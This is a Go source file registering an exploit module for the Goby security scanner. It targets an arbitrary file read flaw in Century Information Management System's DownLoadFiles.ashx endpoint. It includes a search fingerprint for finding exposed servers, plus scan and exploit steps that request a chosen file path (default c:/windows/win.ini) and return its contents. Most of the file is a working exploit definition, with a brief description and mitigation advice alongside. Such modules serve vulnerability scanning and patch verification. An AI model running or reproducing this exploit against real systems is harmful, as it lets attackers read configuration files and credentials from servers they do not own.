package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Century Information Management System /WeChatConfig/ashx/DownLoadFiles.ashx File Read Vulnerability",
    "Description": "<p>This system is an OA office, management, project, human resources, project accounting, graphic and textual archives, mobile office, and intelligent development platform, providing cloud computing based engineering consulting enterprise information solutions.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "Century Information Management System",
    "Homepage": "http://www.jlt01.com/Default.aspx",
    "DisclosureDate": "2024-11-05",
    "PostTime": "2024-11-07",
    "Author": "1971714067@qq.com",
    "FofaQuery": "(body=\"/XtStandardFile/JS/slider/jquery.slider.css\" && body=\"new/font/iconfont.css\") || body=\"/XtStandardFile/JS/jQuery/jquery-1.7.2.min.js\"",
    "GobyQuery": "(body=\"/XtStandardFile/JS/slider/jquery.slider.css\" && body=\"new/font/iconfont.css\") || body=\"/XtStandardFile/JS/jQuery/jquery-1.7.2.min.js\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. Please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.jlt01.com/Default.aspx\">http://www.jlt01.com/Default.aspx</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://cn-sec.com/archives/2683287.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "c:/windows/win.ini ",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini ",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Content-Length": "4"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Mail",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastbody|variable|/WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini ",
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini "
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/WeChatConfig/ashx/DownLoadFiles.ashx?filePath=c:/windows/win.ini ",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Content-Length": "4"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "test|lastbody|regex|([\\s\\S]*)",
                "output|lastbody|text|获取的信息是：{{{test}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.1",
    "Translation": {
        "CN": {
            "Name": "世纪信通管理系统 /WeChatConfig/ashx/DownLoadFiles.ashx 文件读取漏洞",
            "Product": "世纪信通管理系统 ",
            "Description": "<p>该系统为OA办公、经营、项目、人力资源、项目核算、图文档案、移动办公、智能开发平台，尽享基于云计算的工程咨询企业信息化解决方案。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、：<a href=\"http://www.jlt01.com/Default.aspx2\">http://www.jlt01.com/Default.aspx2</a>、通过防火墙等安全设备设置访问策略，设置白名单访问。3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Century Information Management System /WeChatConfig/ashx/DownLoadFiles.ashx File Read Vulnerability",
            "Product": "Century Information Management System",
            "Description": "<p>This system is an OA office, management, project, human resources, project accounting, graphic and textual archives, mobile office, and intelligent development platform, providing cloud computing based engineering consulting enterprise information solutions.<br></p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>1. Please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.jlt01.com/Default.aspx\">http://www.jlt01.com/Default.aspx</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9974"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}